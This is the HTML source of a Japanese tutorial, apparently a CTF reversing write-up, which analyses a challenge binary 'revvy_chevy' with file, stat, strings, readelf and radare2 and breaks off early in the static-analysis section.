&lt;h2 id=&quot;表層解析を行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;表層解析を行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;表層解析を行う&lt;/h2&gt;
&lt;p&gt;まずはダウンロードしたバイナリの表層解析を行いましょう。&lt;/p&gt;
&lt;p&gt;表層解析とは、ファイルそのものの持つ情報を解析する手法です。&lt;/p&gt;
&lt;p&gt;リバースエンジニアリングなどを行う静的解析や、実際にプログラムを実行する動的解析を行う前にファイルの概要を調べるために表層解析を行います。&lt;/p&gt;
&lt;p&gt;今回は、&lt;code class=&quot;language-text&quot;&gt;file&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;strings&lt;/code&gt;コマンドを使って、バイナリのファイルの種類と可読文字列を調査してみます。&lt;/p&gt;
&lt;h3 id=&quot;file&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#file&quot; aria-label=&quot;file permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;file&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;file&lt;/code&gt;コマンドはファイルのタイプを取得するコマンドであり、以下の順番でファイルに対してチェックを行い、最初にマッチした結果を元にファイルタイプを取得します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ファイルシステムテスト&lt;/li&gt;
&lt;li&gt;マジックナンバーテスト&lt;/li&gt;
&lt;li&gt;言語テスト&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;実際の出力結果は次のようになります。&lt;/p&gt;
&lt;p&gt;今回は、64bitのELFバイナリであることが特定されました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# file コマンドでバイナリの種類を調べる&lt;/span&gt;
$ &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; revvy_chevy 
revvy_chevy: ELF &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;-bit LSB shared object, x86-64, version &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;sha1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;271c2040193241b806252d57ce67d110b6c8e78c, &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&quot;token number&quot;&gt;3.2&lt;/span&gt;.0, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;file&lt;/code&gt;コマンドの詳細については以下を参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/file/man1/file.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of FILE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;特に、&lt;code class=&quot;language-text&quot;&gt;file&lt;/code&gt;コマンドのテストの中で最も優先度の高いファイルシステムテストは、&lt;code class=&quot;language-text&quot;&gt;stat&lt;/code&gt;システムコールの結果を元にしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;stat&lt;/span&gt; revvy_chevy 
File: revvy_chevy
Size: &lt;span class=&quot;token number&quot;&gt;14480&lt;/span&gt;     	
Blocks: &lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;         
IO Block: &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;   
regular &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt;
Device: fd00h/64768d	Inode: &lt;span class=&quot;token number&quot;&gt;918235&lt;/span&gt;      Links: &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
Access: &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0664/-rw-rw-r--&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  Uid: &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;/  ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   Gid: &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;/  ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Access: &lt;span class=&quot;token number&quot;&gt;2021&lt;/span&gt;-12-11 &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;:58:48.991810253 +0900
Modify: &lt;span class=&quot;token number&quot;&gt;2021&lt;/span&gt;-12-06 &lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;:58:52.000000000 +0900
Change: &lt;span class=&quot;token number&quot;&gt;2021&lt;/span&gt;-12-11 &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;:58:45.839677244 +0900
Birth: -&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/LDP_man-pages/man2/stat.2.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of STAT&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;strings&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#strings&quot; aria-label=&quot;strings permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;strings&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;strings&lt;/code&gt; コマンドは、解析対象ファイルのバイナリに含まれる可読文字列(ASCII空間のプリンタブルなバイト値)を一覧参照することができるコマンドです。&lt;/p&gt;
&lt;p&gt;デフォルトでは、4文字以上の可読文字列が見つかった場合に出力される仕様です。&lt;/p&gt;
&lt;p&gt;表層解析においては、&lt;code class=&quot;language-text&quot;&gt;strings&lt;/code&gt;コマンドの出力結果から使用しているライブラリや関数名、定義されているテキストなどの解析に役立つ情報が取得できる場合があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# strings コマンドでバイナリの中の可読文字列を取得する&lt;/span&gt;
$ strings revvy_chevy 
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 省略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;詳しくはマニュアルページを参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/GNU_binutils/man1/strings.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of strings&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;readelf&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#readelf&quot; aria-label=&quot;readelf permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;readelf&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;readelf&lt;/code&gt;コマンドは、ELFファイルの概要について取得するためのコマンドです。&lt;/p&gt;
&lt;p&gt;ELFヘッダ内の情報やセクションヘッダ、セグメントなどの情報をフォーマットして表示することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ readelf -a revvy_chevy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://man7.org/linux/man-pages/man1/readelf.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;readelf(1) - Linux manual page&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;バイナリを実行してみる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot; aria-label=&quot;バイナリを実行してみる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;バイナリを実行してみる&lt;/h2&gt;
&lt;p&gt;表層解析の結果から、ダウンロードしたファイルはELF形式の実行可能ファイルであることがわかりました。&lt;/p&gt;
&lt;h3 id=&quot;elfファイルとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#elf%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%A8%E3%81%AF&quot; aria-label=&quot;elfファイルとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ELFファイルとは&lt;/h3&gt;
&lt;p&gt;ちなみにELFとは、&lt;code class=&quot;language-text&quot;&gt;Executable and Linkable Format&lt;/code&gt;の略で、主にLinuxやUNIXシステムで使用されることの多い実行可能ファイルの形式です。&lt;/p&gt;
&lt;p&gt;ELFバイナリは、52バイト(32bitの場合)または64バイト(64bitの場合)の長さのELFヘッダを持ちます。&lt;/p&gt;
&lt;p&gt;ELFヘッダのフォーマットを知ることはELFバイナリの解析を行う上で非常に役に立つ場合があります。&lt;/p&gt;
&lt;p&gt;ELFヘッダの詳細については、以下の英語版のWikipediaの情報が非常に充実しておりわかりやすいのでおすすめです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Executable and Linkable Format - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;実行権限を与える&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%AE%9F%E8%A1%8C%E6%A8%A9%E9%99%90%E3%82%92%E4%B8%8E%E3%81%88%E3%82%8B&quot; aria-label=&quot;実行権限を与える permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;実行権限を与える&lt;/h3&gt;
&lt;p&gt;Linuxシステムの場合、ファイルにはパーミッションが設定され、所有者(ユーザとグループ)と許可される操作(読み取り/書き込み/実行)の2つの観点からアクセス制限が行われています。&lt;/p&gt;
&lt;p&gt;デフォルトの構成のLinuxシステムの場合、今回ダウンロードしたファイルにはまだ実行権限が与えられていないため、まずは実行権限を与える必要があります。&lt;/p&gt;
&lt;p&gt;ファイルの所有者と権限については&lt;code class=&quot;language-text&quot;&gt;ls -l&lt;/code&gt;コマンドで確認することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l
total &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;
-rw-rw-r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; ubuntu ubuntu &lt;span class=&quot;token number&quot;&gt;14480&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;月  &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;:58 revvy_chevy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;詳細については以下を参照します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/gnumaniak/man1/ls.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of LS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxize.com/post/understanding-linux-file-permissions/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Understanding Linux File Permissions | Linuxize&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、ファイルに実行権限を付与するためには&lt;code class=&quot;language-text&quot;&gt;chmod +x&lt;/code&gt;コマンドを利用します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;chmod&lt;/span&gt; +x revvy_chevy 
$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l
total &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;
-rwxrwxr-x &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; ubuntu ubuntu &lt;span class=&quot;token number&quot;&gt;14480&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;月  &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;:58 revvy_chevy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/GNU_fileutils/man1/chmod.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of CHMOD&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上記のように&lt;code class=&quot;language-text&quot;&gt;ls -l&lt;/code&gt;コマンドで権限を確認した際に&lt;code class=&quot;language-text&quot;&gt;x&lt;/code&gt;が付与されていれば実行権限が与えられていることがわかります。&lt;/p&gt;
&lt;p&gt;それでは実行してみましょう。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ./revvy_chevy 
What&lt;span class=&quot;token string&quot;&gt;&apos;s the flag? &amp;lt;input text&gt;
That&apos;&lt;/span&gt;s not it&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;問題バイナリを実行すると、文字列の入力を求められます。&lt;/p&gt;
&lt;p&gt;適当な文字列を入力してみると、&lt;code class=&quot;language-text&quot;&gt;That&apos;s not it...&lt;/code&gt;と表示されました。&lt;/p&gt;
&lt;p&gt;この結果から、恐らくプログラムの中では、入力された文字列とFlagが一致するかを比較する処理を行っていそうであることが想像できます。&lt;/p&gt;
&lt;h2 id=&quot;静的解析を行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;静的解析を行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;静的解析を行う&lt;/h2&gt;
&lt;h3 id=&quot;radare2&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#radare2&quot; aria-label=&quot;radare2 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;radare2&lt;/h3&gt;
&lt;p&gt;radare2は、高機能な解析ツールであり、CUIから逆アセンブルやバイナリパッチの適用、データの比較や検索、デコンパイルなど、様々な処理を呼び出すことができます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;radare2 revvy_chevy&lt;/code&gt;コマンドでradare2を起動し、&lt;code class=&quot;language-text&quot;&gt;aaa&lt;/code&gt;コマンドを呼び出すことで解析をスタートします。&lt;/p&gt;
&lt;p&gt;解析が完了後、&lt;code class=&quot;language-text&quot;&gt;afl&lt;/code&gt;コマンドを呼び出すことで、バイナリ内の関数が一覧されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ radare2 revvy_chevy
&lt;span class=&quot;token comment&quot;&gt;# aaa コマンド&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001100&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; aaa
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Cannot &lt;span class=&quot;token function&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; at 0x00001100 sym. and entry0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;aa&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Analyze all flags starting with sym. and entry0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;aa&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Analyze &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; calls &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;aac&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Analyze len bytes of instructions &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; references &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;aar&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Check &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; objc references
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Check &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; vtables
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Type matching analysis &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; all functions &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;aaft&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Propagate noreturn information
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Use -AA or aaaa to perform additional experimental analysis.

&lt;span class=&quot;token comment&quot;&gt;# afl コマンドで関数をリストアップ&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001100&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; afl
0x00001130    &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;41&lt;/span&gt;   -&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;34&lt;/span&gt;   fcn.00001130&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;なお、radare2のコマンドについてはヘルプがかなりわかりやすいので、&lt;code class=&quot;language-text&quot;&gt;a -h&lt;/code&gt;のようにオプションを付けてヘルプを呼び出してみると良いと思います。&lt;/p&gt;
&lt;p&gt;また、以下のWEBサイトも参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://book.rada.re/first_steps/commandline_flags.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Command-line Flags - The Official Radare2 Book&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;radare2を使って関数の逆アセンブルとデコンパイルを行うには以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 関数のオフセットを実行すると、そのアドレスに移動する&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001100&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; afl
0x00001130    &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;41&lt;/span&gt;   -&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;34&lt;/span&gt;   fcn.00001130
